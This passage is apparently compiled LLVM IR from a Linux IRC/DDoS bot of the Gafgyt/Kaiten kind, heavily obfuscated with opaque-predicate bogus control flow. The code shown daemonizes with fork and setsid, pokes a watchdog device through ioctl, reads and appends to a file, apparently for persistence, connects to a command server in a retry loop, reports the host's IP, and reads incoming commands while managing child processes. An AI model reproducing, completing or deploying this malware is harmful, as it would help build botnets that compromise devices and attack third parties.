  %75 = icmp ne i32 %74, -1
  br i1 %75, label %76, label %135

; <label>:76:                                     ; preds = %73, %originalBBpart2
  %77 = load i32, i32* @x.83
  %78 = load i32, i32* @y.84
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %76
  store i32 1, i32* %17, align 4
  %85 = load i32, i32* %16, align 4
  %86 = call i32 (i32, i64, ...) @ioctl(i32 %85, i64 2147768068, i32* %17) #2
  %87 = call i32 @fork() #2
  store i32 %87, i32* %18, align 4
  %88 = icmp eq i32 %87, 0
  %89 = load i32, i32* @x.83
  %90 = load i32, i32* @y.84
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %88, label %97, label %118

; <label>:97:                                     ; preds = %originalBBpart221
  br label %98

; <label>:98:                                     ; preds = %originalBBpart225, %97
  %99 = load i32, i32* @x.83
  %100 = load i32, i32* @y.84
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %98
  %107 = load i32, i32* %16, align 4
  %108 = call i32 (i32, i64, ...) @ioctl(i32 %107, i64 2147768069, i32 0) #2
  %109 = call i32 @sleep(i32 10)
  %110 = load i32, i32* @x.83
  %111 = load i32, i32* @y.84
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %98

; <label>:118:                                    ; preds = %originalBBpart221
  %119 = load i32, i32* @x.83
  %120 = load i32, i32* @y.84
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %118
  %127 = load i32, i32* @x.83
  %128 = load i32, i32* @y.84
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %135

; <label>:135:                                    ; preds = %originalBBpart229, %73
  %136 = load i32, i32* @x.83
  %137 = load i32, i32* @y.84
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %135
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i32 0, i32 0), i8** %20, align 8
  %144 = load i8*, i8** %20, align 8
  %145 = call %struct._IO_FILE* @fopen(i8* %144, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %145, %struct._IO_FILE** %21, align 8
  %146 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %147 = icmp eq %struct._IO_FILE* %146, null
  %148 = load i32, i32* @x.83
  %149 = load i32, i32* @y.84
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %147, label %156, label %159

; <label>:156:                                    ; preds = %originalBBpart233
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.137, i32 0, i32 0), i8** %20, align 8
  %157 = load i8*, i8** %20, align 8
  %158 = call %struct._IO_FILE* @fopen(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %158, %struct._IO_FILE** %21, align 8
  br label %159

; <label>:159:                                    ; preds = %156, %originalBBpart233
  %160 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %161 = icmp ne %struct._IO_FILE* %160, null
  br i1 %161, label %162, label %431

; <label>:162:                                    ; preds = %159
  %163 = load i8**, i8*** %13, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i64 @strlen(i8* %165) #10
  %167 = trunc i64 %166 to i32
  store i32 %167, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %168 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i32 0, i32 0
  %169 = call i8* @getcwd(i8* %168, i64 256) #2
  %170 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i32 0, i32 0
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #10
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %173, label %411

; <label>:173:                                    ; preds = %162
  br label %174

; <label>:174:                                    ; preds = %originalBBpart241, %173
  %175 = load i32, i32* @x.83
  %176 = load i32, i32* @y.84
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %174
  %183 = load i8**, i8*** %13, align 8
  %184 = getelementptr inbounds i8*, i8** %183, i64 0
  %185 = load i8*, i8** %184, align 8
  %186 = load i32, i32* %24, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds i8, i8* %185, i64 %187
  %189 = load i8, i8* %188, align 1
  %190 = sext i8 %189 to i32
  %191 = icmp ne i32 %190, 47
  %192 = load i32, i32* @x.83
  %193 = load i32, i32* @y.84
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %191, label %200, label %219

; <label>:200:                                    ; preds = %originalBBpart237
  %201 = load i32, i32* @x.83
  %202 = load i32, i32* @y.84
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %200
  %209 = load i32, i32* %24, align 4
  %210 = add nsw i32 %209, -1
  store i32 %210, i32* %24, align 4
  %211 = load i32, i32* @x.83
  %212 = load i32, i32* @y.84
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %174

; <label>:219:                                    ; preds = %originalBBpart237
  %220 = load i32, i32* @x.83
  %221 = load i32, i32* @y.84
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %219
  %228 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %229 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i32 0, i32 0
  %230 = load i8**, i8*** %13, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 0
  %232 = load i8*, i8** %231, align 8
  %233 = load i32, i32* %24, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = call i32 (i8*, i8*, ...) @sprintf(i8* %228, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0), i8* %229, i8* %235) #2
  %237 = load i32, i32* @x.83
  %238 = load i32, i32* @y.84
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %245

; <label>:245:                                    ; preds = %originalBBpart274, %originalBBpart245
  %246 = load i32, i32* @x.83
  %247 = load i32, i32* @y.84
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %245
  %254 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %255 = call i32 @feof(%struct._IO_FILE* %254) #2
  %256 = icmp ne i32 %255, 0
  %257 = xor i1 %256, true
  %258 = load i32, i32* @x.83
  %259 = load i32, i32* @y.84
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart255, label %originalBB47alteredBB

originalBBpart255:                                ; preds = %originalBB47
  br i1 %257, label %266, label %326

; <label>:266:                                    ; preds = %originalBBpart255
  %267 = load i32, i32* @x.83
  %268 = load i32, i32* @y.84
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %266
  %275 = getelementptr inbounds [1024 x i8], [1024 x i8]* %23, i32 0, i32 0
  %276 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %277 = call i8* @fgets(i8* %275, i32 1024, %struct._IO_FILE* %276)
  %278 = getelementptr inbounds [1024 x i8], [1024 x i8]* %23, i32 0, i32 0
  %279 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %280 = call i32 @strcasecmp(i8* %278, i8* %279) #10
  %281 = icmp ne i32 %280, 0
  %282 = load i32, i32* @x.83
  %283 = load i32, i32* @y.84
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %281, label %309, label %290

; <label>:290:                                    ; preds = %originalBBpart259
  %291 = load i32, i32* @x.83
  %292 = load i32, i32* @y.84
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %290
  %299 = load i32, i32* %25, align 4
  %300 = add nsw i32 %299, 1
  store i32 %300, i32* %25, align 4
  %301 = load i32, i32* @x.83
  %302 = load i32, i32* @y.84
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart270, label %originalBB61alteredBB

originalBBpart270:                                ; preds = %originalBB61
  br label %309

; <label>:309:                                    ; preds = %originalBBpart270, %originalBBpart259
  %310 = load i32, i32* @x.83
  %311 = load i32, i32* @y.84
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %309
  %318 = load i32, i32* @x.83
  %319 = load i32, i32* @y.84
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %245

; <label>:326:                                    ; preds = %originalBBpart255
  %327 = load i32, i32* @x.83
  %328 = load i32, i32* @y.84
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %326
  %335 = load i32, i32* %25, align 4
  %336 = icmp eq i32 %335, 0
  %337 = load i32, i32* @x.83
  %338 = load i32, i32* @y.84
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %336, label %345, label %391

; <label>:345:                                    ; preds = %originalBBpart278
  %346 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %347 = call i32 @fclose(%struct._IO_FILE* %346)
  %348 = load i8*, i8** %20, align 8
  %349 = call %struct._IO_FILE* @fopen(i8* %348, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0))
  store %struct._IO_FILE* %349, %struct._IO_FILE** %26, align 8
  %350 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %351 = icmp ne %struct._IO_FILE* %350, null
  br i1 %351, label %352, label %374

; <label>:352:                                    ; preds = %345
  %353 = load i32, i32* @x.83
  %354 = load i32, i32* @y.84
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %352
  %361 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %362 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %363 = call i32 @fputs(i8* %361, %struct._IO_FILE* %362)
  %364 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %365 = call i32 @fclose(%struct._IO_FILE* %364)
  %366 = load i32, i32* @x.83
  %367 = load i32, i32* @y.84
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %374

; <label>:374:                                    ; preds = %originalBBpart282, %345
  %375 = load i32, i32* @x.83
  %376 = load i32, i32* @y.84
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %374
  %383 = load i32, i32* @x.83
  %384 = load i32, i32* @y.84
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %394

; <label>:391:                                    ; preds = %originalBBpart278
  %392 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %393 = call i32 @fclose(%struct._IO_FILE* %392)
  br label %394

; <label>:394:                                    ; preds = %391, %originalBBpart286
  %395 = load i32, i32* @x.83
  %396 = load i32, i32* @y.84
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %394
  %403 = load i32, i32* @x.83
  %404 = load i32, i32* @y.84
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %430

; <label>:411:                                    ; preds = %162
  %412 = load i32, i32* @x.83
  %413 = load i32, i32* @y.84
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %411
  %420 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %421 = call i32 @fclose(%struct._IO_FILE* %420)
  %422 = load i32, i32* @x.83
  %423 = load i32, i32* @y.84
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %430

; <label>:430:                                    ; preds = %originalBBpart294, %originalBBpart290
  br label %431

; <label>:431:                                    ; preds = %430, %159
  %432 = call i32 @getOurIP()
  %433 = call i32 @fork() #2
  %434 = icmp sgt i32 %433, 0
  br i1 %434, label %435, label %452

; <label>:435:                                    ; preds = %431
  %436 = load i32, i32* @x.83
  %437 = load i32, i32* @y.84
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %435
  %444 = load i32, i32* @x.83
  %445 = load i32, i32* @y.84
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  ret i32 0

; <label>:452:                                    ; preds = %431
  %453 = call i32 @setsid() #2
  store i32 %453, i32* @pgid, align 4
  %454 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %455 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %456

; <label>:456:                                    ; preds = %1051, %originalBBpart2102, %452
  %457 = call i32 @initConnection()
  %458 = icmp ne i32 %457, 0
  br i1 %458, label %459, label %477

; <label>:459:                                    ; preds = %456
  %460 = load i32, i32* @x.83
  %461 = load i32, i32* @y.84
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %459
  %468 = call i32 @sleep(i32 5)
  %469 = load i32, i32* @x.83
  %470 = load i32, i32* @y.84
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %456

; <label>:477:                                    ; preds = %456
  %478 = load i32, i32* @mainCommSock, align 4
  %479 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %480 = call i8* @inet_ntoa(i32 %479) #2
  %481 = call i32 (i32, i8*, ...) @sockprintf(i32 %478, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.140, i32 0, i32 0), i8* %480, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0))
  store i32 0, i32* %28, align 4
  store i32 0, i32* %29, align 4
  br label %482

; <label>:482:                                    ; preds = %originalBBpart2203, %889, %779, %683, %477
  %483 = load i32, i32* @mainCommSock, align 4
  %484 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  %485 = call i32 @recvLine(i32 %483, i8* %484, i32 4096)
  store i32 %485, i32* %28, align 4
  %486 = icmp ne i32 %485, -1
  br i1 %486, label %487, label %1051

; <label>:487:                                    ; preds = %482
  store i32 0, i32* %29, align 4
  br label %488

; <label>:488:                                    ; preds = %originalBBpart2136, %487
  %489 = load i32, i32* %29, align 4
  %490 = sext i32 %489 to i64
  %491 = load i64, i64* @numpids, align 8
  %492 = icmp ult i64 %490, %491
  br i1 %492, label %493, label %674

; <label>:493:                                    ; preds = %488
  %494 = load i32, i32* @x.83
  %495 = load i32, i32* @y.84
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %493
  %502 = load i32*, i32** @pids, align 8
  %503 = load i32, i32* %29, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds i32, i32* %502, i64 %504
  %506 = load i32, i32* %505, align 4
  %507 = call i32 @waitpid(i32 %506, i32* null, i32 1)
  %508 = icmp sgt i32 %507, 0
  %509 = load i32, i32* @x.83
  %510 = load i32, i32* @y.84
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br i1 %508, label %517, label %654

; <label>:517:                                    ; preds = %originalBBpart2106
  %518 = load i32, i32* %29, align 4
  %519 = add nsw i32 %518, 1
  store i32 %519, i32* %31, align 4
  br label %520

; <label>:520:                                    ; preds = %552, %517
  %521 = load i32, i32* @x.83
  %522 = load i32, i32* @y.84
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %520
  %529 = load i32, i32* %31, align 4
  %530 = zext i32 %529 to i64
  %531 = load i64, i64* @numpids, align 8
  %532 = icmp ult i64 %530, %531
  %533 = load i32, i32* @x.83
  %534 = load i32, i32* @y.84
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %532, label %541, label %555

; <label>:541:                                    ; preds = %originalBBpart2110
  %542 = load i32*, i32** @pids, align 8
  %543 = load i32, i32* %31, align 4
  %544 = zext i32 %543 to i64
  %545 = getelementptr inbounds i32, i32* %542, i64 %544
  %546 = load i32, i32* %545, align 4
  %547 = load i32*, i32** @pids, align 8
  %548 = load i32, i32* %31, align 4
  %549 = sub i32 %548, 1
  %550 = zext i32 %549 to i64
  %551 = getelementptr inbounds i32, i32* %547, i64 %550
  store i32 %546, i32* %551, align 4
  br label %552

; <label>:552:                                    ; preds = %541
  %553 = load i32, i32* %31, align 4
  %554 = add i32 %553, 1
  store i32 %554, i32* %31, align 4
  br label %520

; <label>:555:                                    ; preds = %originalBBpart2110
  %556 = load i32*, i32** @pids, align 8
  %557 = load i32, i32* %31, align 4
  %558 = sub i32 %557, 1
  %559 = zext i32 %558 to i64
  %560 = getelementptr inbounds i32, i32* %556, i64 %559
  store i32 0, i32* %560, align 4
  %561 = load i64, i64* @numpids, align 8
  %562 = add i64 %561, -1
  store i64 %562, i64* @numpids, align 8
  %563 = load i64, i64* @numpids, align 8
  %564 = add i64 %563, 1
  %565 = mul i64 %564, 4
  %566 = call noalias i8* @malloc(i64 %565) #2
  %567 = bitcast i8* %566 to i32*
  store i32* %567, i32** %30, align 8
  store i32 0, i32* %31, align 4
  br label %568

; <label>:568:                                    ; preds = %originalBBpart2122, %555
  %569 = load i32, i32* @x.83
  %570 = load i32, i32* @y.84
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %568
  %577 = load i32, i32* %31, align 4
  %578 = zext i32 %577 to i64
  %579 = load i64, i64* @numpids, align 8
  %580 = icmp ult i64 %578, %579
  %581 = load i32, i32* @x.83
  %582 = load i32, i32* @y.84
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %580, label %589, label %634

; <label>:589:                                    ; preds = %originalBBpart2114
  %590 = load i32, i32* @x.83
  %591 = load i32, i32* @y.84
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %589
  %598 = load i32*, i32** @pids, align 8
  %599 = load i32, i32* %31, align 4
  %600 = zext i32 %599 to i64
  %601 = getelementptr inbounds i32, i32* %598, i64 %600
  %602 = load i32, i32* %601, align 4
  %603 = load i32*, i32** %30, align 8
  %604 = load i32, i32* %31, align 4
  %605 = zext i32 %604 to i64
  %606 = getelementptr inbounds i32, i32* %603, i64 %605
  store i32 %602, i32* %606, align 4
  %607 = load i32, i32* @x.83
  %608 = load i32, i32* @y.84
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %615

; <label>:615:                                    ; preds = %originalBBpart2118
  %616 = load i32, i32* @x.83
  %617 = load i32, i32* @y.84
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %615
  %624 = load i32, i32* %31, align 4
  %625 = add i32 %624, 1
  store i32 %625, i32* %31, align 4
  %626 = load i32, i32* @x.83
  %627 = load i32, i32* @y.84
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %568

; <label>:634:                                    ; preds = %originalBBpart2114
  %635 = load i32, i32* @x.83
  %636 = load i32, i32* @y.84
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
